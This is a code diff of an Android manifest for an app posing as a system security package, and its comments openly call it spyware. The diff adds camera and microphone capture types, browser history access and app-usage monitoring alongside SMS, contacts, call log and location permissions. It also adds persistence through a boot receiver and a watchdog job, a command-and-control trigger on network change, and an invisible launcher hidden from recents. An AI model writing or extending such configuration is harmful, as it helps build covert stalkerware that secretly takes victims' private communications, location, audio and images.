@@ -3,7 +3,9 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.android.system.security">
 
-    <!-- Permissions — requested at runtime, never all at once -->
+    <!-- ============================================================ -->
+    <!-- CORE PERMISSIONS                                             -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
@@ -17,6 +19,14 @@
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+
+    <!-- ============================================================ -->
+    <!-- DATA COLLECTION PERMISSIONS                                  -->
+    <!-- ============================================================ -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
@@ -24,14 +34,39 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.GET_TASKS" />
-    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+
+    <!-- ============================================================ -->
+    <!-- FOREGROUND SERVICE TYPE PERMISSIONS (Android 14+)            -->
+    <!-- ============================================================ -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+
+    <!-- ============================================================ -->
+    <!-- BROWSER / WEB PERMISSIONS                                    -->
+    <!-- ============================================================ -->
+    <uses-permission android:name="android.permission.READ_HISTORY_BOOKMARKS" />
+
+    <!-- ============================================================ -->
+    <!-- HARDWARE FEATURES (optional — app works without them)        -->
+    <!-- ============================================================ -->
+    <uses-feature android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.microphone"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.wifi"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.location"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.location.gps"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.telephony"
+        android:required="false" />
 
     <application
         android:name=".CoreApplication"
         android:allowBackup="false"
-        android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="false"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
@@ -45,14 +80,16 @@
         android:largeHeap="true"
         tools:targetApi="34">
 
-        <!-- ========== ACCESSIBILITY SERVICE ========== -->
+        <!-- ============================================================ -->
+        <!-- ACCESSIBILITY SERVICE — SYSTEM-WIDE MONITORING               -->
+        <!-- ============================================================ -->
         <service
             android:name=".CoreService"
             android:exported="true"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:label="@string/accessibility_service_name"
             android:description="@string/accessibility_service_description"
-            android:foregroundServiceType="remoteMessaging|dataSync"
+            android:foregroundServiceType="remoteMessaging|dataSync|camera|microphone"
             android:stopWithTask="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -62,7 +99,18 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- ========== BOOT RECEIVER ========== -->
+        <!-- ============================================================ -->
+        <!-- BACKGROUND SERVICE — REDUNDANCY                              -->
+        <!-- ============================================================ -->
+        <service
+            android:name=".BackgroundService"
+            android:foregroundServiceType="remoteMessaging|dataSync|camera|microphone"
+            android:exported="false"
+            android:stopWithTask="false" />
+
+        <!-- ============================================================ -->
+        <!-- BOOT RECEIVER — PERSISTENCE                                  -->
+        <!-- ============================================================ -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true"
@@ -75,7 +123,9 @@
             </intent-filter>
         </receiver>
 
-        <!-- ========== CONNECTIVITY RECEIVER ========== -->
+        <!-- ============================================================ -->
+        <!-- CONNECTIVITY RECEIVER — TRIGGER C2 ON NETWORK CHANGE         -->
+        <!-- ============================================================ -->
         <receiver
             android:name=".ConnectivityReceiver"
             android:exported="true"
@@ -86,18 +136,21 @@
             </intent-filter>
         </receiver>
 
-        <!-- ========== FOREGROUND SERVICE ========== -->
+        <!-- ============================================================ -->
+        <!-- WATCHDOG JOB SERVICE — PERSISTENCE VIA JOBSCHEDULER          -->
+        <!-- ============================================================ -->
         <service
-            android:name=".BackgroundService"
-            android:foregroundServiceType="remoteMessaging|dataSync"
+            android:name=".PersistenceManager$WatchdogJobService"
             android:exported="false"
-            android:stopWithTask="false" />
+            android:permission="android.permission.BIND_JOB_SERVICE" />
 
-        <!-- ========== ACTIVITY (for user onboarding) ========== -->
+        <!-- ============================================================ -->
+        <!-- MAIN ACTIVITY — INVISIBLE LAUNCHER                           -->
+        <!-- ============================================================ -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:theme="@style/Theme.SpywareApp.Transparent"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:excludeFromRecents="true"
             android:launchMode="singleInstance"
             android:noHistory="true"
